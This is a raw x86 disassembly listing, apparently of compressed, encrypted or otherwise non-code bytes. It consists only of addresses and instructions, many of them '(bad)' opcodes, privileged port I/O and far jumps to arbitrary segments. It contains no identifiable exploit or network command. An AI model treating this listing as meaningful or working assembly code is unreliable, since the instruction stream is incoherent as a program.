  40dffa:	or     al,0x32
  40dffc:	mov    ah,0xca
  40dffe:	jne    0x40dfce
  40e000:	loopne 0x40dfd3
  40e002:	js     0x40e05f
  40e004:	xchg   edx,eax
  40e005:	lock dec ebx
  40e007:	xor    eax,0xacbd3f68
  40e00c:	sub    BYTE PTR [esi-0x6b],dh
  40e00f:	(bad)  
  40e010:	mov    esp,0xd9958563
  40e015:	test   al,0x7
  40e017:	and    al,0x0
  40e019:	inc    eax
  40e01a:	test   ecx,0xaf3bbc34
  40e020:	aaa    
  40e021:	jo     0x40e055
  40e023:	rcr    DWORD PTR [esi+ebx*4],1
  40e026:	in     eax,dx
  40e027:	(bad)  
  40e028:	dec    esp
  40e029:	mov    al,BYTE PTR [ebp+0x64]
  40e02c:	in     al,0x9f
  40e02e:	jns    0x40e0ac
  40e030:	or     al,bh
  40e032:	xor    DWORD PTR [di],ebp
  40e035:	xor    ecx,DWORD PTR [ebx+0xf]
  40e038:	jo     0x40dfc3
  40e03a:	jle    0x40e08b
  40e03c:	mov    ds:0xe93a1cd7,al
  40e041:	cld    
  40e042:	in     eax,dx
  40e043:	outs   dx,BYTE PTR ds:[esi]
  40e044:	mov    esp,DWORD PTR [ebx]
  40e046:	push   ecx
  40e047:	mov    cl,0x73
  40e049:	xchg   ecx,eax
  40e04a:	shl    ah,cl
  40e04c:	retf   0x2b28
  40e04f:	cmp    BYTE PTR [edi+edx*8-0x14],bh
  40e053:	dec    edi
  40e054:	in     eax,0xe5
  40e056:	cmp    BYTE PTR [ebx],0x74
  40e059:	mov    ah,0xc5
  40e05b:	test   al,0xfe
  40e05d:	adc    edi,DWORD PTR [ebx-0x32e89115]
  40e063:	adc    al,BYTE PTR [ecx]
  40e065:	xchg   DWORD PTR [edx],eax
  40e067:	ret    0xb6c8
  40e06a:	mov    cl,BYTE PTR [edi-0x36b0f262]
  40e070:	ins    BYTE PTR es:[edi],dx
  40e071:	pop    es
  40e072:	pusha  
  40e073:	shl    edx,0x2
  40e076:	inc    ebx
  40e077:	sbb    edi,DWORD PTR [ecx+0x2fa9bb45]
  40e07d:	push   ecx
  40e07e:	add    eax,0x1ed072ac
  40e083:	hlt    
  40e084:	xchg   ebx,eax
  40e085:	stos   BYTE PTR es:[edi],al
  40e086:	out    0xd5,al
  40e088:	adc    cl,0x51
  40e08b:	(bad)  
  40e08c:	in     al,dx
  40e08d:	jecxz  0x40e052
  40e08f:	pop    esp
  40e090:	inc    edi
  40e091:	xor    al,ah
  40e093:	dec    edx
  40e094:	pop    ds
  40e095:	(bad)  [edi]
  40e097:	sub    DWORD PTR [esi+0x39],esp
  40e09a:	cmp    dh,al
  40e09c:	loop   0x40e07f
  40e09e:	out    dx,al
  40e09f:	arpl   di,si
  40e0a1:	pop    eax
  40e0a2:	adc    eax,0xc31fb76a
  40e0a7:	icebp  
  40e0a8:	dec    sp
  40e0aa:	sbb    DWORD PTR [edi+ebx*8],ecx
  40e0ad:	push   0x70
  40e0af:	cs int3 
  40e0b1:	sub    DWORD PTR [edx],0x1e
  40e0b4:	and    DWORD PTR [eax+0x20c7837e],edi
  40e0ba:	jno    0x40e131
  40e0bc:	dec    edi
  40e0bd:	sar    edi,1
  40e0bf:	repz fnstenv [ecx+0x22]
  40e0c3:	adc    eax,0x9ecad22b
  40e0c8:	adc    edi,DWORD PTR [eax-0x7dc1a647]
  40e0ce:	lock jae 0x40e0e3
  40e0d1:	jecxz  0x40e072
  40e0d3:	jle    0x40e0cf
  40e0d5:	scas   eax,DWORD PTR es:[edi]
  40e0d6:	cmp    BYTE PTR [edx-0xe9802a0],al
  40e0dc:	jb     0x40e060
  40e0de:	in     al,0x8c
  40e0e0:	mov    esi,0xf5963341
  40e0e5:	into   
  40e0e6:	addr16 sbb al,0x88
  40e0e9:	fcom   st(4)
  40e0eb:	push   ds
  40e0ec:	xor    eax,0x6c0167ab
  40e0f1:	es lea esp,es:[esi+0x2d]
  40e0f6:	sbb    DWORD PTR [eax+0x30],edi
  40e0f9:	das    
  40e0fa:	mov    esi,0xffa47958
  40e0ff:	cmp    DWORD PTR [eax+0x4cde8ea0],0x59c467ea
  40e109:	test   al,0xbe
  40e10b:	outs   dx,DWORD PTR ds:[esi]
  40e10c:	shl    ebx,0x9f
  40e10f:	xchg   ecx,eax
  40e110:	inc    ebp
  40e111:	je     0x40e0b7
  40e113:	dec    eax
  40e114:	cmp    BYTE PTR [ebx],bl
  40e116:	jne    0x40e112
  40e118:	cld    
  40e119:	xor    BYTE PTR gs:[ebp-0x52],cl
  40e11d:	popf   
  40e11e:	adc    al,0x2f
  40e120:	dec    esi
  40e121:	inc    ebp
  40e122:	add    ch,ah
  40e124:	dec    ebx
  40e125:	out    0x5a,eax
  40e127:	mov    ds,WORD PTR [edi]
  40e129:	mov    esp,0xfc747ebe
  40e12e:	push   edi
  40e12f:	pusha  
  40e130:	jne    0x40e1aa
  40e132:	jge    0x40e0cd
  40e134:	icebp  
  40e135:	call   0xc686eff6
  40e13a:	sbb    BYTE PTR [ebp+edi*1+0x70cce04],ah
  40e141:	fnstsw WORD PTR [ebx]
  40e143:	xchg   al,dh
  40e145:	pop    eax
  40e146:	xor    DWORD PTR [edx-0x75c467a5],ebp
  40e14c:	xchg   DWORD PTR [ecx+0x2d],ebx
  40e14f:	ins    DWORD PTR es:[edi],dx
  40e150:	pusha  
  40e151:	into   
  40e152:	loope  0x40e1c6
  40e154:	push   cs
  40e155:	nop
  40e156:	int    0x36
  40e158:	sar    DWORD PTR [edi],1
  40e15a:	xor    DWORD PTR [edx-0x45],ebx
  40e15d:	mov    DWORD PTR [esi-0x64c1e21b],0x760e6405
  40e167:	push   0xc210ac70
  40e16c:	jae    0x40e1ad
  40e16e:	pop    ebp
  40e16f:	add    edx,DWORD PTR [eax-0x25]
  40e172:	es inc esp
  40e174:	mov    BYTE PTR [ebp-0x72daabf],dh
  40e17a:	(bad)  
  40e17b:	mov    ebx,0xff69ef05
  40e180:	pop    eax
  40e181:	pop    ss
  40e182:	ror    BYTE PTR [edx+0x3070e336],cl
  40e188:	jae    0x40e1d2
  40e18a:	xchg   edi,eax
  40e18b:	cmp    eax,0x2d3cb7ad
  40e190:	clc    
  40e191:	(bad)  
  40e192:	dec    eax
  40e193:	or     al,0x6a
  40e195:	iret   
  40e196:	and    eax,DWORD PTR [eax+0x7f]
  40e199:	fisttp WORD PTR [eax-0x5c6b3c56]
  40e19f:	pushf  
  40e1a0:	in     eax,dx
  40e1a1:	and    esi,DWORD PTR [edi-0x46]
  40e1a4:	fcmovne st,st(7)
  40e1a6:	and    DWORD PTR [ebp+0xe4ea739],ebx
  40e1ac:	sbb    DWORD PTR [ebx-0x50c1a78],esi
  40e1b2:	loop   0x40e13d
  40e1b4:	dec    esi
  40e1b5:	in     eax,dx
  40e1b6:	mov    eax,0xb9ef11ba
  40e1bb:	and    esi,esi
  40e1bd:	fldcw  WORD PTR [esi-0x71a8e08e]
  40e1c3:	out    dx,eax
  40e1c4:	pop    eax
  40e1c5:	(bad)  
  40e1c6:	sti    
  40e1c7:	or     DWORD PTR [edx],ebp
  40e1c9:	loopne 0x40e233
  40e1cb:	mov    ebp,0x5ae4bca6
  40e1d0:	pop    ds
  40e1d1:	(bad)  
  40e1d2:	out    0x2,al
  40e1d4:	lods   al,BYTE PTR ds:[esi]
  40e1d5:	mov    al,0xfc
  40e1d7:	into   
  40e1d8:	imul   eax,DWORD PTR [ecx+0x14],0xc4603bd9
  40e1df:	stos   BYTE PTR es:[edi],al
  40e1e0:	pop    ebp
  40e1e1:	cmp    edx,edi
  40e1e3:	outs   dx,BYTE PTR ds:[esi]
  40e1e4:	sbb    edi,DWORD PTR [ecx+0x6638ad3]
  40e1ea:	jmp    FWORD PTR [edi+0x1522af4d]
  40e1f0:	test   al,0x2
  40e1f2:	and    al,0x86
  40e1f4:	xchg   BYTE PTR [edx-0x33f33a5e],al
  40e1fa:	pop    ebx
  40e1fb:	jnp    0x40e17d
  40e1fd:	or     BYTE PTR [ecx],0x2f
  40e200:	in     eax,dx
  40e201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e202:	gs (bad) 
  40e204:	cld    
  40e205:	jg     0x40e214
  40e207:	mov    al,ds:0x8173d5e1
  40e20c:	sbb    ah,al
  40e20e:	scas   al,BYTE PTR es:[edi]
  40e20f:	(bad)  
  40e210:	test   ebx,0x234759c2
  40e216:	push   ebx
  40e217:	adc    dh,ch
  40e219:	cmc    
  40e21a:	fs rcr dl,0x7
  40e21e:	push   ebp
  40e21f:	scas   al,BYTE PTR es:[edi]
  40e220:	in     al,0x71
  40e222:	push   ebx
  40e223:	jns    0x40e29c
  40e225:	add    eax,0xa44e0891
  40e22a:	shl    DWORD PTR [ecx],cl
  40e22c:	pop    ss
  40e22d:	loop   0x40e1dc
  40e22f:	xlat   BYTE PTR ds:[ebx]
  40e230:	ja     0x40e218
  40e232:	xchg   esp,eax
  40e233:	xor    eax,0x3e3071f4
  40e238:	cwde   
  40e239:	xor    eax,edx
  40e23b:	mov    ch,BYTE PTR [edx*1+0x63a5e22f]
  40e242:	ins    DWORD PTR es:[edi],dx
  40e243:	ss (bad) 
  40e245:	std    
  40e246:	imul   ecx,esi,0x169c751f
  40e24c:	xor    bl,bl
  40e24e:	call   0x9d242ae1
  40e253:	sub    DWORD PTR [eax+eax*2],ecx
  40e256:	retf   
  40e257:	jg     0x40e1e8
  40e259:	inc    ebp
  40e25a:	mov    dh,0x1e
  40e25c:	test   esp,ecx
  40e25e:	pop    ebp
  40e25f:	call   0xcf18:0x1d1c5df2
  40e266:	adc    esi,edi
  40e268:	xlat   BYTE PTR ds:[ebx]
  40e269:	sub    eax,0x2963c64f
  40e26e:	or     cl,BYTE PTR [ecx-0x3c]
  40e271:	imul   edi,DWORD PTR [eax-0x7c1fbf22],0x40f67114
  40e27b:	fistp  QWORD PTR [edx+ecx*8+0x53]
  40e27f:	test   eax,0xdc6d007d
  40e284:	out    0x95,al
  40e286:	pop    ds
  40e287:	mov    eax,0xe25879b7
  40e28c:	les    edx,FWORD PTR [ebp+edi*8-0x3d]
  40e290:	(bad)  
  40e291:	retf   0x770d
  40e294:	adc    al,BYTE PTR [bx-0x76]
  40e298:	sub    DWORD PTR [edi+ecx*2+0x6a],edi
  40e29c:	in     eax,dx
  40e29d:	add    eax,0xd2fe8072
  40e2a2:	xor    edi,0x67
  40e2a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2a6:	stos   BYTE PTR es:[edi],al
  40e2a7:	mov    ecx,0x9a5217d5
  40e2ac:	xlat   BYTE PTR ds:[ebx]
  40e2ad:	sbb    DWORD PTR [edi+edx*2],ecx
  40e2b0:	or     DWORD PTR [edx+0x73978605],0x6619a12
  40e2ba:	aad    0x1f
  40e2bc:	mov    eax,ds:0x9236228a
  40e2c1:	push   edi
  40e2c2:	jo     0x40e248
  40e2c4:	sub    ah,BYTE PTR [edi+0x17804b79]
  40e2ca:	pusha  
  40e2cb:	aad    0x73
  40e2cd:	arpl   WORD PTR [ecx+0x0],si
  40e2d0:	xchg   ebx,eax
  40e2d1:	scas   eax,DWORD PTR es:[edi]
  40e2d2:	loope  0x40e2f1
  40e2d4:	fucom  st(7)
  40e2d6:	call   0x6da5:0x974de846
  40e2dd:	and    DWORD PTR [ebp-0x6f],edx
  40e2e0:	mov    ch,0x9e
  40e2e2:	div    BYTE PTR [edx]
  40e2e4:	hlt    
  40e2e5:	xchg   ebx,eax
  40e2e6:	xor    eax,0x2bc9d469
  40e2eb:	xchg   BYTE PTR ds:0x1736e1b4,ch
  40e2f1:	xor    ecx,DWORD PTR [ebx+edi*2]
  40e2f4:	and    al,al
  40e2f6:	push   0xedad23d8
  40e2fb:	outs   dx,BYTE PTR ds:[esi]
  40e2fc:	mov    esp,0xa4c4e7e5
  40e301:	imul   ecx,DWORD PTR [ebx+0x2958e6a2],0x55
  40e308:	mov    al,BYTE PTR [ecx]
  40e30a:	jns    0x40e331
  40e30c:	mov    eax,ds:0xf0bdd073
  40e311:	xor    edx,edi
  40e313:	fdivr  st(5),st
  40e315:	ds jmp 0x7e10:0x7dc4339e
  40e31d:	arpl   WORD PTR [esi+0x1f],bx
  40e320:	fist   DWORD PTR [ecx+esi*8-0x2e16d5b0]
  40e327:	pop    ebx
  40e328:	(bad)  
  40e329:	nop
  40e32a:	or     dh,dh
  40e32c:	dec    ebp
  40e32d:	lock loop 0x40e31d
  40e330:	ficomp DWORD PTR [eax-0x5dbf67e0]
  40e336:	shl    BYTE PTR [edi-0x108b611e],cl
  40e33c:	outs   dx,DWORD PTR ds:[esi]
  40e33d:	inc    edi
  40e33e:	jno    0x40e3af
  40e340:	inc    ebx
  40e341:	sub    DWORD PTR [ebx+0x68],edx
  40e344:	outs   dx,DWORD PTR ds:[esi]
  40e345:	cwde   
  40e346:	mov    ds:0x76a3e396,eax
  40e34b:	(bad)  
  40e34c:	popa   
  40e34d:	xor    al,0x22
  40e34f:	loopne 0x40e2dc
  40e351:	mov    dl,0x4b
  40e353:	jnp    0x40e30c
  40e355:	ret    0x82b5
  40e358:	mov    ah,0xaf
  40e35a:	out    dx,al
  40e35b:	ficomp DWORD PTR [esi+ebp*8]
  40e35e:	and    al,0x9a
  40e360:	dec    edi
  40e361:	gs jge 0x40e3d8
  40e364:	retf   0x11c1
  40e367:	shl    ebp,0xb9
  40e36a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e36b:	add    al,0xe8
  40e36d:	inc    edx
  40e36e:	cwde   
  40e36f:	xor    al,0x50
  40e371:	cmc    
  40e372:	rcl    BYTE PTR [ecx],0xc
  40e375:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e376:	fdiv   QWORD PTR [edx]
  40e378:	push   ebp
  40e379:	clc    
  40e37a:	sbb    DWORD PTR [edx],ecx
  40e37c:	push   es
  40e37d:	sbb    al,0xcc
  40e37f:	les    ebx,FWORD PTR ds:[ecx]
  40e382:	inc    esp
  40e383:	sub    al,0x9d
  40e385:	ins    BYTE PTR es:[edi],dx
  40e386:	mov    eax,0x5c1ed692
  40e38b:	xlat   BYTE PTR ds:[ebx]
  40e38c:	jbe    0x40e3cb
  40e38e:	nop
  40e38f:	sahf   
  40e390:	xor    al,0xea
  40e392:	or     eax,DWORD PTR [esi+0x64]
  40e395:	jns    0x40e40a
  40e397:	retf   
  40e398:	jno    0x40e404
  40e39a:	icebp  
  40e39b:	mov    bh,0x88
  40e39d:	inc    esp
  40e39e:	xchg   esp,eax
  40e39f:	jns    0x40e35c
  40e3a1:	call   0x977255fe
  40e3a6:	jge    0x40e3c5
  40e3a8:	imul   ecx,esp,0x5b470c9d
  40e3ae:	jp     0x40e3d2
  40e3b0:	inc    ecx
  40e3b1:	jae    0x40e3ab
  40e3b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3b4:	inc    esp
  40e3b5:	cdq    
  40e3b6:	repz push es
  40e3b8:	mov    ah,0xa
  40e3ba:	adc    al,0xb1
  40e3bc:	rcl    DWORD PTR [ecx],cl
  40e3be:	mov    ds:0xc2d291bc,eax
  40e3c3:	and    al,0xad
  40e3c5:	and    BYTE PTR [edi-0x3f],dh
  40e3c8:	cmp    al,0x87
  40e3ca:	or     DWORD PTR [esi],0xe6b36b69
  40e3d0:	aaa    
  40e3d1:	pop    ds
  40e3d2:	pop    esp
  40e3d3:	add    eax,0xf9ed0139
  40e3d8:	jnp    0x40e35f
  40e3da:	lahf   
  40e3db:	pusha  
  40e3dc:	pop    esp
  40e3dd:	shl    eax,cl
  40e3df:	ret    0x8fd7
  40e3e2:	adc    al,0xa5
  40e3e4:	and    al,0x42
  40e3e6:	xchg   ebx,eax
  40e3e7:	jnp    0x40e435
  40e3e9:	pop    esp
  40e3ea:	dec    ebp
  40e3eb:	push   0xb2b8514
  40e3f0:	out    dx,eax
  40e3f1:	jp     0x40e43c
  40e3f3:	dec    esp
  40e3f4:	inc    eax
  40e3f5:	ret    0x95b5
  40e3f8:	and    dl,ah
  40e3fa:	mov    ch,0xaa
  40e3fc:	dec    esp
  40e3fd:	sub    BYTE PTR [edx+ecx*8-0x61],dh
  40e401:	jle    0x40e44d
  40e403:	mov    eax,0xf09dc6c3
  40e408:	enter  0x4b4e,0xbb
  40e40c:	mov    esp,0xec811ff
  40e411:	add    eax,0xc50ce324
  40e416:	push   edx
  40e417:	mov    dl,0x49
  40e419:	and    eax,0xf97f6bbe
  40e41e:	dec    esp
  40e41f:	pop    ds
  40e420:	mov    ecx,0xcc89e721
  40e425:	retf   
  40e426:	xchg   BYTE PTR [ecx],ah
  40e428:	je     0x40e448
  40e42a:	test   BYTE PTR [edx-0x5b114659],bh
  40e430:	push   edi
  40e431:	dec    ebp
  40e432:	ja     0x40e44b
  40e434:	in     eax,dx
  40e435:	ins    BYTE PTR es:[edi],dx
  40e436:	xchg   esp,eax
  40e437:	fwait
  40e438:	mov    edi,0xbd5b4619
  40e43d:	inc    ebx
  40e43e:	ds pop ss
  40e440:	imul   DWORD PTR [esi+0x723a2452]
  40e446:	add    BYTE PTR [esi+0x77],cl
  40e449:	retf   
  40e44a:	call   0x3508:0x2a6fdeff
  40e451:	mov    al,ds:0xb0a83fd6
  40e456:	pushf  
  40e457:	ins    BYTE PTR es:[edi],dx
  40e458:	test   BYTE PTR [ecx-0x51],ah
  40e45b:	sbb    eax,0x7c774301
  40e460:	xor    eax,0xfaa79412
  40e465:	mov    ecx,DWORD PTR [esi]
  40e467:	hlt    
  40e468:	lahf   
  40e469:	aas    
  40e46a:	push   ds
  40e46b:	shl    ch,cl
  40e46d:	inc    edi
  40e46e:	ins    DWORD PTR es:[edi],dx
  40e46f:	cmp    BYTE PTR [ebx-0x1441c7d3],cl
  40e475:	test   al,0x6a
  40e477:	cmp    BYTE PTR [eax+0x8],ch
  40e47a:	jecxz  0x40e429
  40e47c:	(bad)  
  40e47d:	int3   
  40e47e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e47f:	mov    ch,0x24
  40e481:	(bad)  
  40e482:	ret    
  40e483:	retf   0xd3ec
  40e486:	std    
  40e487:	ret    0xe7a8
  40e48a:	cmp    ch,BYTE PTR [esi-0x6c14d784]
  40e490:	or     BYTE PTR [esi],ch
  40e492:	sahf   
  40e493:	or     eax,0x3152a9b1
  40e498:	outs   dx,DWORD PTR ds:[esi]
  40e499:	mov    ebp,0x1b70fb21
  40e49e:	sar    cl,1
  40e4a0:	std    
  40e4a1:	cmp    eax,0x7c35ea8b
  40e4a6:	and    DWORD PTR [ecx],edi
  40e4a8:	aaa    
  40e4a9:	sub    DWORD PTR [edi+edi*1-0x1f2a4441],edx
  40e4b0:	cmp    DWORD PTR [ebx+eiz*1-0x6e6d25ac],edx
  40e4b7:	add    al,0x19
  40e4b9:	mov    al,ds:0x44d49939
  40e4be:	add    ch,ch
  40e4c0:	ror    DWORD PTR [esi-0x79],0xf2
  40e4c4:	push   esp
  40e4c5:	aam    0x92
  40e4c7:	and    eax,0x8b7f1679
  40e4cc:	fbld   TBYTE PTR [esi-0x51]
  40e4cf:	jecxz  0x40e479
  40e4d1:	and    al,BYTE PTR [ebx]
  40e4d3:	test   eax,0x89e7a4b
  40e4d8:	and    bh,BYTE PTR [eax+0x63228e6]
  40e4de:	test   al,0xcd
  40e4e0:	loopne 0x40e497
  40e4e2:	ror    DWORD PTR [edx-0x2b],0xb
  40e4e6:	inc    ebp
  40e4e7:	lods   eax,DWORD PTR ds:[esi]
  40e4e8:	(bad)  
  40e4e9:	shr    DWORD PTR [esi+0xe],cl
  40e4ec:	fadd   DWORD PTR [esi+0x4d0be30b]
  40e4f2:	stc    
  40e4f3:	ret    0x69f7
  40e4f6:	fwait
  40e4f7:	xchg   ecx,eax
  40e4f8:	mov    ebp,ds
  40e4fa:	dec    eax
  40e4fb:	dec    ebx
  40e4fc:	aam    0x4e
  40e4fe:	push   0xa538c6dc
  40e503:	push   ds
  40e504:	iret   
  40e505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e506:	in     al,0xd0
  40e508:	push   0xffffffea
  40e50a:	pop    ebx
  40e50b:	inc    eax
  40e50c:	sbb    edx,DWORD PTR [ebp+0x2d06f44a]
  40e512:	pop    ecx
  40e513:	ja     0x40e499
  40e515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e516:	(bad)  
  40e517:	xchg   ebx,eax
  40e518:	jbe    0x40e586
  40e51a:	mov    eax,ds:0x766fe407
  40e51f:	test   DWORD PTR gs:[esp+eax*1],ecx
  40e523:	rcl    BYTE PTR [ebx],cl
  40e525:	rcl    BYTE PTR [edi],0x34
  40e528:	add    BYTE PTR ds:0xb7818d6c,0xcb
  40e52f:	cmc    
  40e530:	loope  0x40e523
  40e532:	out    0x99,al
  40e534:	sbb    eax,0xcf45f5ba
  40e539:	or     bh,bh
  40e53b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e53c:	in     al,0x98
  40e53e:	inc    edx
  40e53f:	mul    DWORD PTR [ecx-0x17]
  40e542:	jno    0x40e52c
  40e544:	loope  0x40e54a
  40e546:	sub    ebx,DWORD PTR ds:0xe93e1060
  40e54c:	cld    
  40e54d:	or     eax,edi
  40e54f:	sub    DWORD PTR [edx],ebx
  40e551:	int    0xd2
  40e553:	push   ebp
  40e554:	or     ah,dh
  40e556:	mov    al,ds:0xaa9c0667
  40e55b:	inc    esi
  40e55c:	mov    bh,0x43
  40e55e:	sti    
  40e55f:	ja     0x40e516
  40e561:	pushf  
  40e562:	push   esi
  40e563:	imul   edx,edx,0xffffffc2
  40e566:	add    ch,dh
  40e568:	repnz fiadd DWORD PTR [esi-0x3110b812]
  40e56f:	pop    esi
  40e570:	(bad)  
  40e571:	push   ecx
  40e572:	mov    edx,0x45e8df0e
  40e577:	xchg   esi,eax
  40e578:	cmp    al,0x3b
  40e57a:	xor    DWORD PTR [ebx+0x7f],edx
  40e57d:	adc    ah,BYTE PTR [eax]
  40e57f:	jp     0x40e57d
  40e581:	rcl    BYTE PTR [eax],0xd1
  40e584:	out    0x7f,al
  40e586:	jb     0x40e571
  40e588:	sub    DWORD PTR [esi+0x3c9b55d1],ecx
  40e58e:	(bad)  
  40e58f:	dec    esi
  40e590:	inc    edi
  40e591:	les    edx,FWORD PTR [esi-0x1b]
  40e594:	mov    bl,BYTE PTR [ebx]
  40e596:	cmc    
  40e597:	pop    edi
  40e598:	sbb    BYTE PTR [eax+edx*2-0x4fa1819e],dl
  40e59f:	neg    DWORD PTR [ecx+0x46]
  40e5a2:	xchg   DWORD PTR [esi],edx
  40e5a4:	lds    ebp,FWORD PTR [edx-0x7e]
  40e5a7:	sahf   
  40e5a8:	inc    edx
  40e5a9:	fist   WORD PTR [ecx+0x5d717c00]
  40e5af:	out    0x75,al
  40e5b1:	or     al,cl
  40e5b3:	sub    eax,0xb8d2eaeb
  40e5b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5b9:	retf   0xfd3b
  40e5bc:	dec    edx
  40e5bd:	out    0x8a,al
  40e5bf:	fdiv   st(2),st
  40e5c1:	cmp    ebp,DWORD PTR [edx]
  40e5c3:	cmp    BYTE PTR [esi+0xb191274],ch
  40e5c9:	js     0x40e640
  40e5cb:	clc    
  40e5cc:	mov    DWORD PTR [ebx-0x272b63fc],ebp
  40e5d2:	adc    DWORD PTR [ebx-0x22ed419e],0x3a
  40e5d9:	push   es
  40e5da:	ja     0x40e582
  40e5dc:	loopne 0x40e588
  40e5de:	push   es
  40e5df:	push   ebp
  40e5e0:	push   cs
  40e5e1:	sbb    DWORD PTR [ecx],ebp
  40e5e3:	in     eax,dx
  40e5e4:	leave  
  40e5e5:	pushf  
  40e5e6:	mov    ebx,0x924a84ce
  40e5eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5ec:	sub    al,0xec
  40e5ee:	xchg   esp,eax
  40e5ef:	dec    ecx
  40e5f0:	push   esp
  40e5f1:	clc    
  40e5f2:	sbb    al,0xb6
  40e5f4:	xor    al,0xa5
  40e5f6:	xchg   edi,eax
  40e5f7:	loop   0x40e66b
  40e5f9:	or     eax,0x5f9b591d
  40e5fe:	(bad)  [ecx+0x2b]
  40e601:	das    
  40e602:	mov    WORD PTR [edi],fs
  40e604:	in     al,dx
  40e605:	in     al,dx
  40e606:	lahf   
  40e607:	lock test eax,0xec450721
  40e60d:	jne    0x40e62f
  40e60f:	loop   0x40e680
  40e611:	fs data16 mov al,0xd7
  40e615:	(bad)  
  40e616:	push   esi
  40e617:	add    DWORD PTR [ecx],eax
  40e619:	jecxz  0x40e655
  40e61b:	or     bl,BYTE PTR [esi+0x31]
  40e61e:	cmp    DWORD PTR ds:0x7bea88bb,esp
  40e624:	scas   al,BYTE PTR es:[edi]
  40e625:	dec    edx
  40e626:	ins    BYTE PTR es:[edi],dx
  40e627:	ss enter 0xf9f8,0xbf
  40e62c:	xchg   ebx,eax
  40e62d:	push   0x6b
  40e62f:	stc    
  40e630:	mov    ebx,DWORD PTR [ebx]
  40e632:	lds    edi,FWORD PTR [ecx+0x1a050c55]
  40e638:	sub    BYTE PTR [edx],0x15
  40e63b:	stc    
  40e63c:	jb     0x40e5e9
  40e63e:	out    0xf2,eax
  40e640:	or     al,0x10
  40e642:	inc    ebx
  40e643:	mov    ch,0x80
  40e645:	test   al,0x7d
  40e647:	sbb    esp,esi
  40e649:	(bad)  
  40e64b:	call   0xa81b:0x988b2247
  40e652:	add    BYTE PTR [ecx],cl
  40e654:	mov    bl,0xc6
  40e656:	loopne 0x40e6ca
  40e658:	and    al,0x7c
  40e65a:	iret   
  40e65b:	jmp    0xb271:0xb84e61da
  40e662:	mov    esp,0x2f6d72df
  40e667:	stc    
  40e668:	dec    ebp
  40e669:	test   bl,0xb3
  40e66c:	pop    edi
  40e66d:	shl    BYTE PTR [ebx],1
  40e66f:	rcr    DWORD PTR [esi],1
  40e671:	mov    esp,edi
  40e673:	or     eax,0xa025a583
  40e678:	pop    ebx
  40e679:	push   cs
  40e67a:	mov    fs,esi
  40e67c:	mov    bh,0x66
  40e67e:	adc    DWORD PTR [ebx+0x1b2d583],ecx
  40e684:	ins    BYTE PTR es:[edi],dx
  40e685:	in     eax,dx
  40e686:	and    eax,0xb8af56fc
  40e68b:	addr16 jbe 0x40e663
  40e68e:	call   0xb1eb0fbb
  40e693:	mov    ch,0x88
  40e695:	inc    ecx
  40e696:	cmp    al,0x49
  40e698:	jb     0x40e69e
  40e69a:	cmp    dl,BYTE PTR [eax-0x43374737]
  40e6a0:	jmp    0xc3979490
  40e6a5:	enter  0xccba,0xe3
  40e6a9:	or     ebp,ebp
  40e6ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6ac:	sub    edi,DWORD PTR [ebp+0x65]
  40e6af:	cli    
  40e6b0:	lahf   
  40e6b1:	data16 in al,0xfc
  40e6b4:	inc    BYTE PTR [eax-0x6d178a8c]
  40e6ba:	fdiv   st,st(0)
  40e6bc:	dec    esi
  40e6bd:	fsubrp st(3),st
  40e6bf:	popf   
  40e6c0:	sub    esi,DWORD PTR [esi+0x9]
  40e6c3:	out    0xcd,al
  40e6c5:	adc    al,BYTE PTR ds:0x5e6e0f46
  40e6cb:	adc    al,0xd3
  40e6cd:	mov    esp,0x8f5006bd
  40e6d2:	packsswb mm2,QWORD PTR es:[ecx+esi*1+0x11]
  40e6d8:	out    0x8d,al
  40e6da:	or     bl,BYTE PTR [ecx+ebp*8]
  40e6dd:	inc    edx
  40e6de:	les    esi,FWORD PTR [eax+0xe669c50]
  40e6e4:	or     al,0x7a
  40e6e6:	mov    bl,0x81
  40e6e8:	or     al,0xa1
  40e6ea:	dec    edi
  40e6eb:	jge    0x40e74b
  40e6ed:	mov    eax,0xcabd76bd
  40e6f2:	jp     0x40e716
  40e6f4:	jbe    0x40e69f
  40e6f6:	mov    cl,0xcd
  40e6f8:	mov    ebx,0xacbc88b1
  40e6fd:	leave  
  40e6fe:	pop    ebx
  40e6ff:	or     al,0xf6
  40e701:	outs   dx,DWORD PTR ds:[esi]
  40e702:	call   0x7d5600ac
  40e707:	loop   0x40e770
  40e709:	cwde   
  40e70a:	int3   
  40e70b:	mov    esi,0xe5702dc9
  40e710:	xor    al,ch
  40e712:	dec    ecx
  40e713:	fnsave [edi+0x36]
  40e716:	jg     0x40e765
  40e718:	imul   edi,ebp,0x68
  40e71b:	pop    es
  40e71c:	fimul  WORD PTR [edi-0x73]
  40e71f:	popf   
  40e720:	fidivr DWORD PTR [edx+0x3b824760]
  40e726:	(bad)  
  40e727:	fwait
  40e728:	pushf  
  40e729:	cmp    bl,dh
  40e72b:	jle    0x40e7aa
  40e72d:	cmc    
  40e72e:	out    dx,eax
  40e72f:	daa    
  40e730:	xor    DWORD PTR [ebp-0x7f55cfbb],esp
  40e736:	jl     0x40e7b2
  40e738:	inc    eax
  40e739:	into   
  40e73a:	cld    
  40e73b:	jp     0x40e74a
  40e73d:	dec    esi
  40e73e:	push   ebx
  40e73f:	ins    DWORD PTR es:[edi],dx
  40e740:	or     al,0x9c
  40e742:	sub    eax,0x5f18ce37
  40e747:	jmp    FWORD PTR [edi+esi*4]
  40e74a:	xchg   ecx,esp
  40e74c:	fwait
  40e74d:	out    0x75,eax
  40e74f:	and    cl,BYTE PTR [esi-0xfef4b8f]
  40e755:	shl    ah,cl
  40e757:	icebp  
  40e758:	pop    DWORD PTR [esi-0x2607c4ba]
  40e75e:	inc    ebx
  40e75f:	pop    ebp
  40e760:	jne    0x40e75f
  40e762:	jp     0x40e719
  40e764:	xor    ch,dh
  40e766:	mov    dh,0xd7
  40e768:	mov    al,ds:0x6b54e31f
  40e76d:	push   es
